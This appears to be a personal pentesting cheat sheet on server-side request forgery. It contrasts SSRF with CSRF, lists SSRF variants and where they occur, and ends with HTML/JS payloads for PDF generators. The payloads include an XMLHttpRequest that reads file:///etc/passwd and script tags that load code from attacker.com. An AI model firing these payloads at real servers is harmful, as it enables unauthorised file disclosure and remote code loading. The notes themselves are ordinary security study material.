# CSRF vs SSRF
It's natural thinking as they are almost the same cause they look similar(you will mostly use HTML/JS) and XSS sometimes to archive a mail goal to read/do something you can't with your username.
The main difference here is the target, in **CSRF=target** is the client(a victim will have to click voluntary on a malicious code) where in a SSRF=the target is the application/back-end and we want to get a LFI/RCE so the back-end will be targeted so to say.

# What is SSRF?
Allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. To do that, we usually need to supply or modify URLs used by the target application to read or submit data.
What can a SSRF unveil?
```
    Interacting with known internal systems
    Discovering internal services via port scans
    Disclosing local/sensitive data
    Including files in the target application
    Leaking NetNTLM hashes using UNC Paths (Windows)
    Achieving remote code execution
```
Where can we find them?
```
    Parts of HTTP requests, including URLs
    File imports such as HTML, PDFs, images, etc.
    Remote server connections to fetch data
    API specification imports
    Dashboards including ping and similar functionalities to check server statuses
```
SSRF Types?
```
    Abusing Intermediary Applications: Accessing internal applications not accessible from our network by leveraging specific exposed binary                protocols.
    Server-Side Request Forgery (SSRF): Making the hosting application server issue requests to arbitrary external domains or internal                      resources in an attempt to identify sensitive data.
    Server-Side Includes Injection (SSI): Injecting a payload so that ill-intended Server-Side Include directives are parsed to achieve                     remote code execution or leak sensitive data. This vulnerability occurs when poorly validated user input manages to become                   part of a response that is parsed for Server-Side Include directives.
    Edge-Side Includes Injection (ESI): ESI is an XML-based markup language used to tackle performance issues by temporarily storing dynamic                web content that the regular web caching protocols do not save. Edge-Side Include Injection occurs when an attacker manages                  to reflect ill-intended ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot                   validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI                tags supplied by an attacker.
    Server-Side Template Injection (SSTI): Template Engines facilitate dynamic data presentation through web pages or emails. Server-Side                   Template Injection is essentially injecting ill-intended template directives (payload) inside a template, leveraging Template                Engines that insecurely mix user input with a given template.
    Extensible Stylesheet Language Transformations Server-Side Injection (XSLT): XSLT is an XML-based language usually used when                            transforming XML documents into HTML, another XML document, or PDF. Extensible Stylesheet Language Transformations Server-Side Injection can occur when arbitrary XSLT file upload is possible or when an application generates the XSL Transformationâ€™s XML                   document dynamically using unvalidated input from the user.
```


# Tricks
### URL Encoding in RCE via SSRF
If you discover a RCE via SSRF you will have to URL encode your payload as spaces and other chars won't be allowed. REMEMBER to URL encode as many times as the number of endpoint the command is transiting ex if you have:
```
http://culo.com --> http://internal.culo.com = double URL encoding
http://culo.com --> http://internal.culo.com --> http://127.0.0.1 = triple URL encoding
```
### SSRF Exploits
Usually when you are attacking with SSRF you use JS, but sometimes even HTML language if the vulnerable application is HTML to PDF converter.
```
OBS: 9/10 times Dynamic PDF generators (ex. wkHTMLtoPDF) are vulnerbale to SSRF.
```
## What are SSRF?
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.
### Detect
```
<img src="x" onerror="document.write('test')" />
```
### Path Disclosure
```
<img src="x" onerror="document.write(window.location)" />
OR
<script> document.write(window.location) </script>

```
### LFI via SSRF
```
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");x.send();
</script>
```
### RFI
```
<script src="http://attacker.com/myscripts.js"></script>
OR
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```